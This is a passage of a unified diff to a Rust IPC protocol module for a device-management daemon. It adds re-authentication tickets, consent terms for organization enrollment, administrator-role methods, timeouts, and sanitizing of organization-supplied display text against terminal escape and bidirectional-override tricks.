@@ -105,12 +105,26 @@ pub const CLIENT_CONNECT_TIMEOUT: Duration = Duration::from_secs(5);
 pub const CLIENT_RESPONSE_TIMEOUT: Duration = Duration::from_secs(15);
 /// M5 (contract sections 2, 5.9): raised per-request processing bound for
 /// `enroll.start` — the pipeline contains a full reconcile pass and, on
-/// TCG, nft operations are slow.
-pub const ENROLL_START_PROCESS_TIMEOUT: Duration = Duration::from_secs(60);
+/// TCG, nft operations are slow. Its own control-plane calls spend at most
+/// 35 s, its reconcile pass 25 s more (punard's
+/// `ENROLL_CONTROL_PLANE_BUDGET` and `RECONCILE_CONTROL_PLANE_BUDGET`), and
+/// its local work [`SERVER_PROCESS_TIMEOUT`]: 70 s.
+pub const ENROLL_START_PROCESS_TIMEOUT: Duration = Duration::from_secs(70);
 /// M5 (contract sections 2, 7): raised client response timeout for
 /// `punarctl enroll start` only, covering [`ENROLL_START_PROCESS_TIMEOUT`]
 /// with margin.
 pub const ENROLL_START_CLIENT_TIMEOUT: Duration = Duration::from_secs(90);
+/// M5 (contract sections 2, 5.6): the processing bound of `reconcile` on an
+/// enrolled device. Its local work keeps [`SERVER_PROCESS_TIMEOUT`]; its
+/// calls to the control plane (the policy fetch, the compliance and
+/// inventory reports, the query pull) share one budget of 25 s, waits
+/// behind other calls included (punard's `RECONCILE_CONTROL_PLANE_BUDGET`),
+/// and a call that does not fit in what is left is not sent: 10 + 25 s.
+pub const RECONCILE_PROCESS_TIMEOUT: Duration = Duration::from_secs(35);
+/// M5 (contract section 2): `punarctl reconcile`'s response timeout,
+/// covering [`RECONCILE_PROCESS_TIMEOUT`] with margin, so the timer's
+/// `punard-reconcile.service` does not fail on a slow or black-holed link.
+pub const RECONCILE_CLIENT_TIMEOUT: Duration = Duration::from_secs(45);
 
 /// `punarctl` process exit codes (Plate D-014 section III; docs/api/ipc.md
 /// section 7).
@@ -302,47 +316,64 @@ impl IpcError {
         }
     }
 
-    /// The canonical root-only denial (contract section 3.2 example; SPEC
-    /// section 73 voice). `target` names what was refused (usually a
-    /// capability id), `retry_command` is the full command to re-run as
-    /// root. When `capability` is given it is included in
-    /// `details.capability`.
+    /// The canonical denial of a non-root `capabilities.set` (contract section
+    /// 3.2 example; SPEC section 73 voice). `retry_command` is the command to
+    /// run again once the grant is live.
     ///
     /// The message deliberately contains both "administrator" and "personal
     /// defaults" — the section 74.4 in-VM check greps for exactly those.
     ///
-    /// **M9 amendment.** Since M3 this message has promised that
-    /// "just-in-time elevation arrives in Milestone 9". It has arrived, so
-    /// the message now names the command that exists — but only when the
-    /// refusal is about a **capability**, because a grant is per-capability
-    /// (SPEC section 48: no wildcard elevation). `reconcile` and the
-    /// enrollment mutations have no grant to ask for and keep pointing at
-    /// root, which is the honest answer for them.
-    pub fn denied_needs_root(target: &str, capability: Option<&str>, retry_command: &str) -> Self {
-        let mut details = json!({
-            "decision": "deny",
-            "policy_ids": [POLICY_PERSONAL_DEFAULTS],
-        });
-        if let (Some(map), Some(capability)) = (details.as_object_mut(), capability) {
-            map.insert("capability".to_string(), Value::String(capability.into()));
-        }
-        let next = match capability {
-            Some(capability) => format!(
-                "Next step: re-run as root: {retry_command}\n\
-                 Or ask for time-boxed privilege: \
-                 punarctl privilege request --capability {capability} --reason \"<why>\""
-            ),
-            None => format!("Next step: re-run as root: {retry_command}"),
-        };
+    /// THE NEXT STEP IS A GRANT, NEVER ROOT. Until 2026-09 this said "re-run as
+    /// root: sudo punarctl …", which no person on a Punar device can do: root
+    /// is locked, no account is in `wheel`, and Punar authors no sudoers rule
+    /// (docs/design/onboarding.md section 1.6). A grant is per capability (SPEC
+    /// section 48: no wildcard elevation), which is why this helper takes one
+    /// and why a refusal that is not about a registered capability uses
+    /// [`IpcError::denied_root_only`] instead.
+    pub fn denied_needs_grant(capability: &str, retry_command: &str) -> Self {
         IpcError::with_details(
             ErrorCode::Denied,
             format!(
-                "Changing {target} needs administrator privileges.\n\
+                "Changing {capability} needs administrator privileges.\n\
                  Policy: personal defaults — an ordinary user may hold privilege for a \
                  bounded window, never permanently (SPEC section 48).\n\
-                 {next}"
+                 Next step: ask for time-boxed privilege: punarctl privilege request \
+                 --capability {capability} --reason \"<why>\"; once you approve it, \
+                 run {retry_command} again."
             ),
-            details,
+            json!({
+                "decision": "deny",
+                "policy_ids": [POLICY_PERSONAL_DEFAULTS],
+                "capability": capability,
+            }),
+        )
+    }
+
+    /// The denial for a method only root may call, when there is no grant to
+    /// ask for: `resource` is not a registered capability, so offering
+    /// `privilege request` would send the person to a command that answers
+    /// `not_found`.
+    ///
+    /// No person on a Punar device is root (docs/design/onboarding.md section
+    /// 1.6), so the refusal must never tell them to become root. `next_step` is
+    /// the honest answer for this method: what the device already does on its
+    /// own, where to look, or, where nobody can do it by design, who does.
+    pub fn denied_root_only(target: &str, resource: &str, next_step: &str) -> Self {
+        IpcError::with_details(
+            ErrorCode::Denied,
+            format!(
+                "{target} needs administrator privileges that no account on this \
+                 device holds.\n\
+                 Policy: personal defaults — only root may do this, and Punar gives no \
+                 person root: root is locked and no account holds sudo \
+                 (docs/design/onboarding.md section 1.6).\n\
+                 Next step: {next_step}"
+            ),
+            json!({
+                "decision": "deny",
+                "policy_ids": [POLICY_PERSONAL_DEFAULTS],
+                "resource": resource,
+            }),
         )
     }
 
@@ -486,6 +517,14 @@ pub struct CapabilitiesSetParams {
     /// capability's `allowed_desired_states` / `state_schema` and syntax
     /// rules; never interpreted as a command (SPEC sections 10, 60).
     pub desired_state: Value,
+    /// A single-use `punar-authd` ticket minted for this call
+    /// (`capabilities.set`) and this caller's process (F0; contract sections
+    /// 5.4 and 23.2). Read only on a capability a device administrator sets
+    /// directly — the device's keyboard layout — and never recorded, audited,
+    /// forwarded or returned. Absent is legitimate for uid 0 and on the grant
+    /// path. Additive: absent on every request an older client sends.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
 }
 
 /// Params for `policy.set` — the device administrator's layer
@@ -553,6 +592,275 @@ pub struct PolicyExplainParams {
 #[serde(deny_unknown_fields)]
 pub struct EnrollStartParams {
     pub org_domain: String,
+    /// The enrollment code the organisation issued (a Smplify enrollment
+    /// token). Optional on the wire because the dev/CI mock needs none;
+    /// the real control plane refuses to register without one. punarctl
+    /// reads it from stdin or a hidden prompt, never from argv, and punard
+    /// never audits or returns it.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub code: Option<String>,
+    /// A single-use re-authentication ticket minted by `punar-authd` for this
+    /// caller, exactly as for [`PolicySetParams::ticket`]. Enrollment hands the
+    /// device's management to an organization, so a person confirms it with
+    /// their password at the moment they do it. Absent is legitimate only for
+    /// uid 0. punard spends it and never forwards, audits or returns it.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
+    /// The person has been told, and accepts, that this organization enrolls
+    /// devices so that nobody on the device can unenroll them
+    /// (`enrollment.removable: false` in its organization document —
+    /// docs/development/smplify-enrollment.md section 3.1). Without it punard
+    /// refuses such an enrollment before registering, so an organization can
+    /// never make a device non-removable without its user's explicit yes.
+    /// Meaningless, and ignored, for a removable enrollment.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub accept_non_removable: bool,
+    /// The person has been told, and accepts, that this organization enrolls
+    /// devices as its own (`enrollment.ownership: "organization"` in its
+    /// organization document — docs/development/smplify-enrollment.md section
+    /// 3.2): the device's inventory then also carries its serial number and
+    /// every application installed for all users. Nothing proves that an
+    /// organization owns the hardware, so without this punard refuses such an
+    /// enrollment before registering, and an organization's word alone never
+    /// widens what a device reports. Meaningless, and ignored, for a personal
+    /// enrollment.
+    #[serde(default, skip_serializing_if = "std::ops::Not::not")]
+    pub accept_organization_owned: bool,
+}
+
+impl EnrollStartParams {
+    /// Whether this request accepts `term`.
+    pub fn accepts(&self, term: EnrollmentTerm) -> bool {
+        match term {
+            EnrollmentTerm::NonRemovable => self.accept_non_removable,
+            EnrollmentTerm::OrganizationOwned => self.accept_organization_owned,
+        }
+    }
+}
+
+/// A term an organization's document sets on its enrollment, which the
+/// enrolling person must accept before punard registers the device
+/// (docs/development/smplify-enrollment.md sections 3.1 and 3.2).
+///
+/// One refusal names every term a request left unaccepted, in
+/// `details.terms` by [`EnrollmentTerm::as_str`], so a client asks about all
+/// of them at once and sends back exactly the flags it was asked for. The
+/// meaning is here, not in each client, so the refusal and the prompt a
+/// person answers cannot describe a term differently.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum EnrollmentTerm {
+    /// `enrollment.removable: false`: nobody on the device can unenroll it.
+    NonRemovable,
+    /// `enrollment.ownership: "organization"`: the organization owns the
+    /// device, and its inventory says more.
+    OrganizationOwned,
+}
+
+impl EnrollmentTerm {
+    /// Every term, in the order refusals and prompts list them.
+    pub const ALL: [EnrollmentTerm; 2] = [
+        EnrollmentTerm::NonRemovable,
+        EnrollmentTerm::OrganizationOwned,
+    ];
+
+    /// The wire name, as `details.terms` lists it.
+    pub fn as_str(self) -> &'static str {
+        match self {
+            EnrollmentTerm::NonRemovable => "non_removable",
+            EnrollmentTerm::OrganizationOwned => "organization_owned",
+        }
+    }
+
+    pub fn from_wire(name: &str) -> Option<EnrollmentTerm> {
+        EnrollmentTerm::ALL
+            .into_iter()
+            .find(|term| term.as_str() == name)
+    }
+
+    /// The [`EnrollStartParams`] field that accepts it.
+    pub fn param(self) -> &'static str {
+        match self {
+            EnrollmentTerm::NonRemovable => "accept_non_removable",
+            EnrollmentTerm::OrganizationOwned => "accept_organization_owned",
+        }
+    }
+
+    /// The `punarctl enroll start` flag that accepts it.
+    pub fn flag(self) -> &'static str {
+        match self {
+            EnrollmentTerm::NonRemovable => "--accept-non-removable",
+            EnrollmentTerm::OrganizationOwned => "--accept-organization-owned",
+        }
+    }
+
+    /// `details.reason` of a refusal that names this term alone. A refusal
+    /// that names more than one says [`ENROLLMENT_TERMS_NOT_ACCEPTED`].
+    pub fn refusal_reason(self) -> &'static str {
+        match self {
+            EnrollmentTerm::NonRemovable => "non_removable_not_accepted",
+            EnrollmentTerm::OrganizationOwned => "organization_owned_not_accepted",
+        }
+    }
+
+    /// A short name for the term, as a prompt lists it.
+    pub fn title(self) -> &'static str {
+        match self {
+            EnrollmentTerm::NonRemovable => "Not removable",
+            EnrollmentTerm::OrganizationOwned => "Owned by the organization",
+        }
+    }
+
+    /// What accepting the term means for the person enrolling, said plainly
+    /// in one sentence without a final full stop. Fixed text: the
+    /// organization's name is never part of the sentence a person agrees
+    /// to, so no name it chooses can make that sentence say something else.
+    pub fn meaning(self) -> &'static str {
+        match self {
+            EnrollmentTerm::NonRemovable => {
+                "once enrolled, only erasing and reinstalling this device ends the \
+                 enrollment; nobody on it, you included, can unenroll it"
+            }
+            EnrollmentTerm::OrganizationOwned => {
+                "besides the device facts every enrollment reports, the organization also \
+                 receives this device's serial number and the list of every app installed for \
+                 all users on it"
+            }
+        }
+    }
+}
+
+/// `details.reason` of an `enroll.start` refusal that names more than one
+/// unaccepted [`EnrollmentTerm`].
+pub const ENROLLMENT_TERMS_NOT_ACCEPTED: &str = "enrollment_terms_not_accepted";
+
+/// An organization's name as it may appear beside an [`EnrollmentTerm`] a
+/// person is agreeing to. The organization chooses its display name, and a
+/// terminal obeys what is in it: an escape sequence could conceal the text
+/// after it, a bidirectional override could reorder it, and a line or
+/// paragraph separator could start what looks like a line of Punar's own.
+/// Any of them would let the organization hide the very term it asks the
+/// person to accept. Each such character, and every other invisible format
+/// character, becomes U+FFFD, so the attempt stays visible.
+///
+/// punard already cleans the name once, where it reads the organization
+/// document ([`organization_name`]); this is the terminal's own defence, for
+/// every name it prints, whatever produced it.
+pub fn term_safe_name(name: &str) -> String {
+    name.chars()
+        .map(|c| {
+            if c.is_control() || is_invisible_format(c) || matches!(c, '\u{2028}' | '\u{2029}') {
+                '\u{FFFD}'
+            } else {
+                c
+            }
+        })
+        .collect()
+}
+
+/// The longest organization name punard keeps, in characters: enough for
+/// any real one, and too short to fill a screen or to hold a paragraph that
+/// argues with the term beside it.
+pub const MAX_ORGANIZATION_NAME_CHARS: usize = 64;
+
+/// An organization's own name, as punard keeps and shows it. The
+/// organization chooses it, and punard prints it to a person beside the
+/// terms they accept, in every view of the enrollment, in the shell's bar
+/// and as a browser context's name, so it is cleaned once, where punard
+/// reads the organization document, and every surface shows the same text:
+///
+/// - whitespace of every kind, line and paragraph separators included,
+///   becomes one space, and runs of it collapse;
+/// - control characters and invisible format characters (bidirectional
+///   overrides and isolates, zero-width characters, the byte-order mark,
+///   tag characters) are dropped;
+/// - more than [`MAX_ORGANIZATION_NAME_CHARS`] characters are cut to that
+///   many, the last an ellipsis, so the cut shows.
+///
+/// `None` when nothing printable is left.
+pub fn organization_name(raw: &str) -> Option<String> {
+    organization_text(raw, MAX_ORGANIZATION_NAME_CHARS)
+}
+
+/// The longest text punard repeats that an organization's control plane or
+/// policy chose: a refusal's message, the policy loader's words about an
+/// envelope (which quote the envelope's own keys). Long enough for any real
+/// explanation, too short to bury the next step printed after it.
+pub const MAX_ORGANIZATION_TEXT_CHARS: usize = 300;
+
+/// Text an organization chose, cleaned by [`organization_name`]'s rules and
+/// cut at `max_chars` characters: for everything punard reads from a control
+/// plane or about the organization's policy that can reach a terminal, an
+/// error message or the journal. Cleaned once, where punard reads it, so no
+/// surface after that has to remember to. `None` when nothing printable is
+/// left.
+pub fn organization_text(raw: &str, max_chars: usize) -> Option<String> {
+    let max_chars = max_chars.max(1);
+    let mut kept: Vec<char> = Vec::with_capacity(max_chars.min(1024) + 1);
+    let mut space = false;
+    for c in raw.chars() {
+        if c.is_whitespace() {
+            space = !kept.is_empty();
+            continue;
+        }
+        if c.is_control() || is_invisible_format(c) {
+            continue;
+        }
+        if space {
+            kept.push(' ');
+            space = false;
+        }
+        kept.push(c);
+        if kept.len() > max_chars {
+            kept.truncate(max_chars - 1);
+            while kept.last() == Some(&' ') {
+                kept.pop();
+            }
+            kept.push('\u{2026}');
+            break;
+        }
+    }
+    (!kept.is_empty()).then(|| kept.into_iter().collect())
+}
+
+/// Unicode's format characters (general category Cf) and the Hangul fillers:
+/// characters that draw nothing yet change what is drawn around them.
+fn is_invisible_format(c: char) -> bool {
+    matches!(
+        c,
+        '\u{00AD}'
+            | '\u{0600}'..='\u{0605}'
+            | '\u{061C}'
+            | '\u{06DD}'
+            | '\u{070F}'
+            | '\u{0890}'..='\u{0891}'
+            | '\u{08E2}'
+            | '\u{115F}'..='\u{1160}'
+            | '\u{180E}'
+            | '\u{200B}'..='\u{200F}'
+            | '\u{202A}'..='\u{202E}'
+            | '\u{2060}'..='\u{206F}'
+            | '\u{3164}'
+            | '\u{FEFF}'
+            | '\u{FFA0}'
+            | '\u{FFF9}'..='\u{FFFB}'
+            | '\u{110BD}'
+            | '\u{110CD}'
+            | '\u{13430}'..='\u{1343F}'
+            | '\u{1BCA0}'..='\u{1BCA3}'
+            | '\u{1D173}'..='\u{1D17A}'
+            | '\u{E0001}'
+            | '\u{E0020}'..='\u{E007F}'
+    )
+}
+
+/// Params for `enroll.stop` (M5, contract section 5.11). Optional on the wire:
+/// root sends none, and a person sends the single-use re-authentication
+/// ticket `punar-authd` minted for them, exactly as for `enroll.start`.
+#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct EnrollStopParams {
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
 }
 
 /// Local catalog lookup. `id` asks for one app plus a live source
@@ -587,6 +895,14 @@ pub struct AppsInstallParams {
     /// permissions were shown and cannot be replayed against a later version.
     #[serde(default)]
     pub acknowledge_host_access: bool,
+    /// A single-use re-authentication ticket `punar-authd` minted for this
+    /// call and this caller's process (F0 review, contract section 23.2): an
+    /// application installed, updated or removed system-wide changes what
+    /// everyone on the device runs, so a person other than root must be a
+    /// device administrator and present one. Absent is legitimate only for
+    /// uid 0. Additive: absent on every request an older client sends.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
 }
 
 /// Remove the native package associated with one catalog id.
@@ -594,6 +910,14 @@ pub struct AppsInstallParams {
 #[serde(deny_unknown_fields)]
 pub struct AppsRemoveParams {
     pub id: String,
+    /// A single-use re-authentication ticket `punar-authd` minted for this
+    /// call and this caller's process (F0 review, contract section 23.2): an
+    /// application installed, updated or removed system-wide changes what
+    /// everyone on the device runs, so a person other than root must be a
+    /// device administrator and present one. Absent is legitimate only for
+    /// uid 0. Additive: absent on every request an older client sends.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
 }
 
 /// Update one installed catalog application, or every installed catalog
@@ -606,6 +930,14 @@ pub struct AppsUpdateParams {
     pub id: Option<String>,
     #[serde(default)]
     pub all: bool,
+    /// A single-use re-authentication ticket `punar-authd` minted for this
+    /// call and this caller's process (F0 review, contract section 23.2): an
+    /// application installed, updated or removed system-wide changes what
+    /// everyone on the device runs, so a person other than root must be a
+    /// device administrator and present one. Absent is legitimate only for
+    /// uid 0. Additive: absent on every request an older client sends.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
 }
 
 // -- M11 user-created web apps and browser contexts ------------------------
@@ -754,6 +1086,35 @@ impl ResolveDecision {
 pub struct ApprovalsResolveParams {
     pub approval_id: String,
     pub decision: ResolveDecision,
+    /// A single-use `punar-authd` ticket for the resolving person (F0-S1,
+    /// contract section 23.2). Approving a `capability_set` or
+    /// `privilege_request` approval changes device-wide state, so a person
+    /// other than root must be a device administrator and present one;
+    /// denying, and approving a `credential_request`, take none. Additive:
+    /// absent on every request an older client sends.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
+}
+
+/// Params for `admins.set` (contract section 23.3): give or take away one
+/// account's device-administrator role.
+///
+/// The account is named, never a uid: a role belongs to a person's account,
+/// and the daemon resolves the name against the accounts this device has.
+/// Exactly one account per call, so every change is one audited decision
+/// with one author.
+#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
+#[serde(deny_unknown_fields)]
+pub struct AdminsSetParams {
+    /// The account whose role changes.
+    pub user: String,
+    /// `true` makes the account a device administrator; `false` takes the
+    /// role away. The last administrator can never be removed.
+    pub administrator: bool,
+    /// A single-use re-authentication ticket `punar-authd` minted for the
+    /// caller. Absent is legitimate only for uid 0.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub ticket: Option<String>,
 }
 
 /// Params for `privilege.request` (contract section 14.8).
@@ -828,6 +1189,11 @@ impl AuditTailParams {
 pub enum Method {
     /// `status` — daemon/device summary. Read; any connected peer.
     Status,
+    /// `device.posture` — the device's own posture, hardware and power: the
+    /// same Posture and Hardware the managed inventory sends an organization,
+    /// readable by the person at the device. Read; any connected peer, like
+    /// `status`.
+    DevicePosture,
     /// `capabilities.list` — all registry descriptors, observed live. Read.
     CapabilitiesList,
     /// `capabilities.get` — one descriptor. Read.
@@ -860,7 +1226,7 @@ pub enum Method {
     EnrollStatus,
     /// `enroll.stop` (M5, contract section 5.11) — local unenroll: remove
     /// the org layers, restore personal state. Root-only; always audited.
-    EnrollStop,
+    EnrollStop(EnrollStopParams),
     /// `approvals.list` (M9, contract section 14.2) — pending first, then
     /// recently resolved. Read; any connected peer; sweeps expiry lazily.
     ApprovalsList,
@@ -916,6 +1282,18 @@ pub enum Method {
     WebAppsContextCreate(WebAppsContextCreateParams),
     /// `webapps.context_delete` — remove an unused caller-owned context.
     WebAppsContextDelete(WebAppsContextDeleteParams),
+    /// `pim.mail.open` — launch the first-party Mail surface with an
+    /// own-profile, read-only PIM capability. Human only; accepts no path,
+    /// command, account identifier, or secret material.
+    PimMailOpen,
+    /// `pim.mail.account_add` — open the one-use protected Mail account
+    /// connection surface. Human only; accepts no provider, endpoint,
+    /// account identifier, path, command, or secret material.
+    PimMailAccountAdd,
+    /// `pim.mail.account_manage` — open the protected Mail account management
+    /// surface with a Settings-scoped PIM capability. Human only; accepts no
+    /// account id, path, command, endpoint, or secret material.
+    PimMailAccountManage,
     /// `update.status` — read-only, local release/channel/health/rollback
     /// evidence. Any admitted peer may inspect it; no check or mutation is
     /// hidden behind this method.
@@ -951,12 +1329,22 @@ pub enum Method {
     /// `install.status` — live-environment read side of the atomic installer
     /// progress document. Never carries passphrases or recovery material.
     InstallStatus,
+    /// `admins.list` (F0-S1, contract section 23.3) — who administers this
+    /// device, who decides that, and whether the caller is one. Read; any
+    /// admitted peer.
+    AdminsList,
+    /// `admins.set` (F0-S1, contract section 23.3) — give or take away one
+    /// account's device-administrator role. Root, or an administrator with a
+    /// fresh ticket; agents never; the last administrator is never removed;
+    /// always audited.
+    AdminsSet(AdminsSetParams),
 }
 
 impl Method {
     /// Every wire method name, in contract-table order.
-    pub const NAMES: [&'static str; 41] = [
+    pub const NAMES: [&'static str; 47] = [
         "status",
+        "device.posture",
         "capabilities.list",
         "capabilities.get",
         "capabilities.set",
@@ -987,6 +1375,9 @@ impl Method {
         "webapps.uninstall",
         "webapps.context_create",
         "webapps.context_delete",
+        "pim.mail.open",
+        "pim.mail.account_add",
+        "pim.mail.account_manage",
         "update.status",
         "update.check",
         "update.apply",
@@ -997,6 +1388,32 @@ impl Method {
         "install.apply",
         "install.recovery_ack",
         "install.status",
+        "admins.list",
+        "admins.set",
+    ];
+
+    /// Names the first-party apps amendment reserves on this socket
+    /// (docs/api/ipc.md section 24), in the order their milestones add them.
+    ///
+    /// A reserved name is **not** in [`Method::NAMES`] and has no variant: it
+    /// parses to `unknown_method` exactly like a name nobody ever proposed,
+    /// until the milestone that brings its handler moves it into the table.
+    /// Listing it here is how the amendment holds the name — a later change
+    /// cannot take one of these for a different meaning without editing this
+    /// list, and the test beside it says so.
+    pub const RESERVED: [&'static str; 9] = [
+        // M2 Activity Monitor.
+        "resources.sample",
+        "process.signal",
+        // M5 Text Editor.
+        "sysfiles.list",
+        "sysfiles.apply",
+        "sysfiles.revert",
+        // Files P2 network shares.
+        "storage.share_mount",
+        "storage.share_unmount",
+        "storage.share_list",
+        "storage.share_forget",
     ];
 
     /// The wire method name. Exhaustive match, no wildcard — this is the
@@ -1004,6 +1421,7 @@ impl Method {
     pub fn name(&self) -> &'static str {
         match self {
             Method::Status => "status",
+            Method::DevicePosture => "device.posture",
             Method::CapabilitiesList => "capabilities.list",
             Method::CapabilitiesGet(_) => "capabilities.get",
             Method::CapabilitiesSet(_) => "capabilities.set",
@@ -1014,7 +1432,7 @@ impl Method {
             Method::PolicySet(_) => "policy.set",
             Method::EnrollStart(_) => "enroll.start",
             Method::EnrollStatus => "enroll.status",
-            Method::EnrollStop => "enroll.stop",
+            Method::EnrollStop(_) => "enroll.stop",
             Method::ApprovalsList => "approvals.list",
             Method::ApprovalsGet(_) => "approvals.get",
             Method::ApprovalsCreate(_) => "approvals.create",
@@ -1034,6 +1452,9 @@ impl Method {
             Method::WebAppsUninstall(_) => "webapps.uninstall",
             Method::WebAppsContextCreate(_) => "webapps.context_create",
             Method::WebAppsContextDelete(_) => "webapps.context_delete",
+            Method::PimMailOpen => "pim.mail.open",
+            Method::PimMailAccountAdd => "pim.mail.account_add",
+            Method::PimMailAccountManage => "pim.mail.account_manage",
             Method::UpdateStatus => "update.status",
             Method::UpdateCheck(_) => "update.check",
             Method::UpdateApply(_) => "update.apply",
@@ -1044,6 +1465,8 @@ impl Method {
             Method::InstallApply(_) => "install.apply",
             Method::InstallRecoveryAck(_) => "install.recovery_ack",
             Method::InstallStatus => "install.status",
+            Method::AdminsList => "admins.list",
+            Method::AdminsSet(_) => "admins.set",
         }
     }
 
@@ -1054,6 +1477,7 @@ impl Method {
     pub fn requires_root(&self) -> bool {
         match self {
             Method::Status
+            | Method::DevicePosture
             | Method::CapabilitiesList
             | Method::CapabilitiesGet(_)
             | Method::AuditTail(_)
@@ -1068,9 +1492,12 @@ impl Method {
             // by a ticket punar-authd minted for this very caller; the daemon
             // enforces that, this flag only says it is not uid-0-only.
             Method::PolicySet(_) => false,
-            // M5 (contract section 5): enrollment mutations are root-only,
-            // exactly like `capabilities.set`.
-            Method::EnrollStart(_) | Method::EnrollStop => true,
+            // Enrollment is NOT root-only, for the same reason as
+            // `policy.set`: nobody at the keyboard is ever root on a Punar
+            // device. The daemon admits root, or a person carrying a ticket
+            // punar-authd minted for them, and refuses agents at any uid
+            // (contract sections 5.9, 5.11).
+            Method::EnrollStart(_) | Method::EnrollStop(_) => false,
             // M9 (contract section 14.2). Reads stay open. `create` and
             // `consume` are root-only: minting approvals and spending them
             // are privileged operations whose only callers are punard
@@ -1109,16 +1536,26 @@ impl Method {
             | Method::WebAppsUninstall(_)
             | Method::WebAppsContextCreate(_)
             | Method::WebAppsContextDelete(_) => false,
+            // The handler separately enforces human-only, own-profile launch
+            // from a live desktop process. It is not root-only.
+            Method::PimMailOpen | Method::PimMailAccountAdd | Method::PimMailAccountManage => false,
             Method::UpdateStatus => false,
-            Method::UpdateCheck(_)
-            | Method::UpdateApply(_)
-            | Method::UpdateReconcileCandidate
-            | Method::UpdateRollback(_) => true,
+            // A person checks, installs and rolls back with a password
+            // confirmation, as for enrollment: no account on a Punar device is
+            // root. The daemon enforces the ticket; this flag only says "not
+            // uid-0-only". Candidate reconcile stays the boot service's.
+            Method::UpdateCheck(_) | Method::UpdateApply(_) | Method::UpdateRollback(_) => false,
+            Method::UpdateReconcileCandidate => true,
             Method::InstallTargets => false,
             Method::InstallPlan(_) | Method::InstallApply(_) | Method::InstallRecoveryAck(_) => {
                 true
             }
             Method::InstallStatus => false,
+            // The role is read by anyone admitted; changing it is decided in
+            // the daemon (root, or an administrator with a fresh ticket), for
+            // the reason `policy.set` is not root-only: nobody at a Punar
+            // keyboard is root.
+            Method::AdminsList | Method::AdminsSet(_) => false,
         }
     }
 
@@ -1126,18 +1563,22 @@ impl Method {
     pub fn params_value(&self) -> Option<Value> {
         let params = match self {
             Method::Status
+            | Method::DevicePosture
             | Method::CapabilitiesList
             | Method::Reconcile
             | Method::PolicyEffective
             | Method::EnrollStatus
-            | Method::EnrollStop
             | Method::ApprovalsList
             | Method::PrivilegeStatus
             | Method::AppsList
+            | Method::PimMailOpen
+            | Method::PimMailAccountAdd
+            | Method::PimMailAccountManage
             | Method::UpdateStatus
             | Method::UpdateReconcileCandidate
             | Method::InstallTargets
-            | Method::InstallStatus => return None,
+            | Method::InstallStatus
+            | Method::AdminsList => return None,
             Method::CapabilitiesGet(p) => serde_json::to_value(p),
             Method::CapabilitiesSet(p) => serde_json::to_value(p),
             Method::AuditTail(p) => serde_json::to_value(p),
@@ -1159,12 +1600,14 @@ impl Method {
             Method::WebAppsUninstall(p) => serde_json::to_value(p),
             Method::WebAppsContextCreate(p) => serde_json::to_value(p),
             Method::WebAppsContextDelete(p) => serde_json::to_value(p),
+            Method::EnrollStop(p) => serde_json::to_value(p),
             Method::UpdateCheck(p) => serde_json::to_value(p),
             Method::UpdateApply(p) => serde_json::to_value(p),
             Method::UpdateRollback(p) => serde_json::to_value(p),
             Method::InstallPlan(p) => serde_json::to_value(p),
             Method::InstallApply(p) => serde_json::to_value(p),
             Method::InstallRecoveryAck(p) => serde_json::to_value(p),
+            Method::AdminsSet(p) => serde_json::to_value(p),
         };
         Some(params.expect("params structs serialize infallibly"))
     }
@@ -1178,6 +1621,9 @@ impl Method {
     pub fn from_wire(method: &str, params: Option<Value>) -> Result<Method, IpcError> {
         match method {
             "status" => Self::expect_no_params(method, params).map(|()| Method::Status),
+            "device.posture" => {
+                Self::expect_no_params(method, params).map(|()| Method::DevicePosture)
+            }
             "capabilities.list" => {
                 Self::expect_no_params(method, params).map(|()| Method::CapabilitiesList)
             }
@@ -1203,7 +1649,10 @@ impl Method {
             "enroll.status" => {
                 Self::expect_no_params(method, params).map(|()| Method::EnrollStatus)
             }
-            "enroll.stop" => Self::expect_no_params(method, params).map(|()| Method::EnrollStop),
+            "enroll.stop" => match params {
+                None => Ok(Method::EnrollStop(EnrollStopParams::default())),
+                Some(value) => Self::parse_params(method, value).map(Method::EnrollStop),
+            },
             "approvals.list" => {
                 Self::expect_no_params(method, params).map(|()| Method::ApprovalsList)
             }
@@ -1249,6 +1698,13 @@ impl Method {
             "webapps.context_delete" => {
                 Self::parse_required_params(method, params).map(Method::WebAppsContextDelete)
             }
+            "pim.mail.open" => Self::expect_no_params(method, params).map(|()| Method::PimMailOpen),
+            "pim.mail.account_add" => {
+                Self::expect_no_params(method, params).map(|()| Method::PimMailAccountAdd)
+            }
+            "pim.mail.account_manage" => {
+                Self::expect_no_params(method, params).map(|()| Method::PimMailAccountManage)
+            }
             "update.status" => {
                 Self::expect_no_params(method, params).map(|()| Method::UpdateStatus)
             }
@@ -1273,6 +1729,8 @@ impl Method {
             "install.status" => {
                 Self::expect_no_params(method, params).map(|()| Method::InstallStatus)
             }
+            "admins.list" => Self::expect_no_params(method, params).map(|()| Method::AdminsList),
+            "admins.set" => Self::parse_required_params(method, params).map(Method::AdminsSet),
             unknown => Err(IpcError::with_details(
                 ErrorCode::UnknownMethod,
                 format!(
@@ -1752,6 +2210,20 @@ pub struct EnrollStartResult {
     pub attestation: String,
     pub enrolled_at: String,
     pub first_sync: FirstSync,
+    /// Whether this enrollment can be undone from the device: the
+    /// organization's `enrollment.removable`, fixed at enrollment
+    /// (docs/development/smplify-enrollment.md section 3.1). Optional only so
+    /// a result from a daemon that predates it still parses.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub removable: Option<bool>,
+    /// Whether the organization owns this device: its
+    /// `enrollment.ownership`, accepted by the person and fixed at enrollment
+    /// (docs/development/smplify-enrollment.md section 3.2). Only then does
+    /// the inventory carry the serial number and every application installed
+    /// for all users. Optional only so a result from a daemon that predates
